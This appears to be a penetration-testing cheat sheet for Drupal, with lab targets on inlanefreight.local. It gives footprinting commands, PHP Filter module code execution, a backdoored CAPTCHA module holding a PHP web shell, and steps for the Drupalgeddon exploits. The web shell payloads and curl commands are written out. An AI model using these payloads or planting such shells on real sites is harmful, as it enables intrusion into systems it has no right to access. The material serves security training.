## Discovery/Footprinting

| Command                                                     | Description                               |
| ----------------------------------------------------------- | ----------------------------------------- |
| \`curl -s <http://drupal.inlanefreight.local>               | grep Drupal\`                             |
| Browse to <http://drupal.inlanefreight.local/CHANGELOG.txt> | Check for istances of Drupal              |
| Browse to <http://drupal.inlanefreight.local/README.txt>    | Check for istances of Drupal              |
| Browse to <http://drupal.inlanefreight.local/robots.txt>    | Check for istances of Drupal or its nodes |

---

## Attacking PHP Filter Module prior to version 8

It's possible to login as an admin to enable the PHP Filter Module in versions<=8. The PHP Filter Module basically allows PHP code to always be executed.

1. After enabling the module, navigate to Content - Basic Page
2. Add the following RCE payload: `<?phpsystem($_GET['cmd']); ?>`
3. Note: toggle `text format` - `php code` in the options below and click on save
4. Gain RCE: `curl -s http://drupal-qa.inlanefreight.local/node/3?cmd=id \| grep uid \| cut -f4 -d">"`

---

## Attacking PHP Filter Module after version 8

1. Download the PHP Filter Module: `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
2. Once downloaded go to `Administration` - `Reports` - `Available updates`.
3. Click on Browse - Select the file - Install the `php-8.x-1.1.tar.gz`.
4. Follow the same steps as described above (same as drupal version prior to 8)

---

## Uploading a Backdoored Modul

Drupal allows users with appropriate permissions to upload a new module
Let's pick a module such as [CAPTCHA](https://www.drupal.org/project/captcha). Scroll down and copy the link for the tar.gz [archive](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

```shell
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz

tar -xvf captcha-8.x-1.2.tar.gz
```

Create a PHP web shell with the contents:
```php
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```

Next, we need to create a `.htaccess` file to give ourselves access to the folder. 
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

```shell
mv shell.php .htaccess captcha
```

Compress:
```shell
tar cvf captcha.tar.gz captcha/
```

Click on `Manage` and then `Extend` on the sidebar. Next, click on the `+ Install new module` button, and we will be taken to the install page, such as `http://drupal.inlanefreight.local/admin/modules/install` Browse to the backdoored Captcha archive and click `Install`.

Browse to `/modules/captcha/shell.php` to execute commands.
```shell
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

---

## Drupalgeddon: Drupal RCE Vulnerabilities

| CVE                           | Versions                         | Description                                                                                                         |
| ----------------------------- | -------------------------------- | ------------------------------------------------------------------------------------------------------------------- |
| CVE-2014-3704 [Drupalgeddon]  | versions 7.0 up to 7.31          | Pre-authenticated SQL injection that could be used to upload a malicious form or create a new admin user            |
| CVE-2018-7600 [Drupalgeddon2] | versions prior to 7.58 and 8.5.1 | Insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected |
| CVE-2018-7602 [Drupalgeddon3] | versions 7.x and 8.x             | This **authenticated** flaw exploits improper validation in the Form API                                            |

### POC:

1. [Drupalgeddon](https://www.exploit-db.com/exploits/34992): can use `exploit/multi/http/drupal_drupageddon` msf module.
2. [Drupalgeddon2](https://www.exploit-db.com/exploits/44448):
   * Run the PoC without edits to check if the vulnerability exists
   * To gain RCE, first encode the PHP payload: `echo '<?php system($_GET[cmd]);?>' | base64`
   * Edit the `echo line in the PoC` as follows: `echo "BASE64OUTPUT" | base64 -d | tee shell.php`
   * Run the script: `python3 drupalgeddon2.py`
   * Gain RCE: `curl http://drupal-dev.inlanefreight.local/shell.php?cmd=id`
1. [Drupalgeddon3](https://www.exploit-db.com/exploits/44557/): can also use [Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3).

---